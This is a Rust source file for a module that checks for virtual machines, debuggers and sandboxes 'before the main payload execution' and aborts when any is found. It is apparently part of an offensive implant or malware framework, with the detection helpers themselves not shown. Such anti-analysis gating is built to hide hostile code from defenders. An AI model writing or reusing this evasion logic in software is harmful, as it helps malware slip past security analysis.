//! Evasion Check Task
//!
//! Provides a task that performs evasion detection checks before
//! the main payload execution.

use log::{info, warn};

use super::anti_debug::AntiDebug;
use super::anti_sandbox::AntiSandbox;
use super::anti_vm::{AntiVM, VMType};
use super::errors::EvasionError;
use crate::module::core::{CancellationToken, CoreConfig, CoreError};

/// Configuration for evasion checks
#[derive(Debug, Clone)]
pub struct EvasionConfig {
    /// Check for VM environment
    pub check_vm: bool,
    /// Check for debugger
    pub check_debugger: bool,
    /// Check for sandbox
    pub check_sandbox: bool,
    /// Abort execution if evasion detected
    pub abort_on_detection: bool,
    /// Log detection details
    pub log_details: bool,
}

impl Default for EvasionConfig {
    fn default() -> Self {
        Self {
            check_vm: true,
            check_debugger: true,
            check_sandbox: true,
            abort_on_detection: true,
            log_details: true,
        }
    }
}

/// Result of evasion checks
#[derive(Debug, Clone)]
pub struct EvasionCheckResult {
    pub vm_detected: bool,
    pub vm_type: VMType,
    pub debugger_detected: bool,
    pub sandbox_detected: bool,
    pub should_abort: bool,
    pub details: Vec<String>,
}

impl EvasionCheckResult {
    pub fn is_safe(&self) -> bool {
        !self.vm_detected && !self.debugger_detected && !self.sandbox_detected
    }
}

/// Evasion check task
pub struct EvasionTask {
    config: EvasionConfig,
}

impl EvasionTask {
    pub fn new(config: EvasionConfig) -> Self {
        Self { config }
    }

    pub fn with_defaults() -> Self {
        Self::new(EvasionConfig::default())
    }

    /// Perform all configured evasion checks
    pub fn check(&self) -> Result<EvasionCheckResult, EvasionError> {
        self.check_with_cancel(&CancellationToken::new())
    }

    /// Perform all configured evasion checks with cancellation support
    pub fn check_with_cancel(&self, cancel_token: &CancellationToken) -> Result<EvasionCheckResult, EvasionError> {
        let mut details = Vec::new();
        let mut vm_detected = false;
        let mut vm_type = VMType::None;
        let mut debugger_detected = false;
        let mut sandbox_detected = false;

        // VM Check
        if self.config.check_vm {
            if cancel_token.is_cancelled() { return Err(EvasionError::Internal("cancelled".to_string())); }
            if AntiVM::is_virtual_machine() {
                vm_detected = true;
                vm_type = AntiVM::get_vm_type();
                let msg = format!("VM detected: {}", vm_type);
                if self.config.log_details {
                    warn!("{}", msg);
                }
                details.push(msg);
            } else if self.config.log_details {
                info!("VM check passed: no virtual machine detected");
            }
        }

        // Debugger Check
        if self.config.check_debugger {
            if cancel_token.is_cancelled() { return Err(EvasionError::Internal("cancelled".to_string())); }
            if AntiDebug::is_debugger_present() {
                debugger_detected = true;
                let msg = "Debugger detected".to_string();
                if self.config.log_details {
                    warn!("{}", msg);
                }
                details.push(msg);
            } else if self.config.log_details {
                info!("Debugger check passed: no debugger detected");
            }
        }

        // Sandbox Check
        if self.config.check_sandbox {
            if cancel_token.is_cancelled() { return Err(EvasionError::Internal("cancelled".to_string())); }
            if AntiSandbox::is_sandbox() {
                sandbox_detected = true;
                let msg = "Sandbox environment detected".to_string();
                if self.config.log_details {
                    warn!("{}", msg);
                }
                details.push(msg);
            } else if self.config.log_details {
                info!("Sandbox check passed: no sandbox detected");
            }
        }

        let should_abort = self.config.abort_on_detection
            && (vm_detected || debugger_detected || sandbox_detected);

        Ok(EvasionCheckResult {
            vm_detected,
            vm_type,
            debugger_detected,
            sandbox_detected,
            should_abort,
            details,
        })
    }
}

impl crate::module::core::CoreTask for EvasionTask {
    fn name(&self) -> &str {
        "evasion_check"
    }

    fn run(&self, _config: &CoreConfig) -> Result<(), CoreError> {
        self.run_with_cancel(_config, &CancellationToken::new())
    }

    fn run_with_cancel(&self, _config: &CoreConfig, cancel_token: &CancellationToken) -> Result<(), CoreError> {
        match self.check_with_cancel(cancel_token) {
            Ok(result) => {
                if result.is_safe() {
                    info!("Evasion checks passed: environment appears safe");
                    Ok(())
                } else if result.should_abort {
                    let reason = result.details.join("; ");
                    Err(CoreError::TaskFailed {
                        task: self.name().to_string(),
                        reason: format!("Evasion detected: {}", reason),
                    })
                } else {
                    // Detections but abort_on_detection is false
                    warn!(
                        "Evasion checks completed with warnings: {}",
                        result.details.join("; ")
                    );
                    Ok(())
                }
            }
            Err(e) => Err(CoreError::TaskFailed {
                task: self.name().to_string(),
                reason: e.to_string(),
            }),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::module::core::CoreTask;

    #[test]
    fn test_evasion_task_creation() {
        let task = EvasionTask::with_defaults();
        assert_eq!(task.name(), "evasion_check");
    }

    #[test]
    fn test_evasion_config() {
        let config = EvasionConfig::default();
        assert!(config.check_vm);
        assert!(config.check_debugger);
        assert!(config.check_sandbox);
        assert!(config.abort_on_detection);
        assert!(config.log_details);
    }

    #[test]
    fn test_evasion_check_result() {
        let result = EvasionCheckResult {
            vm_detected: false,
            vm_type: VMType::None,
            debugger_detected: false,
            sandbox_detected: false,
            should_abort: false,
            details: Vec::new(),
        };
        assert!(result.is_safe());
    }
}
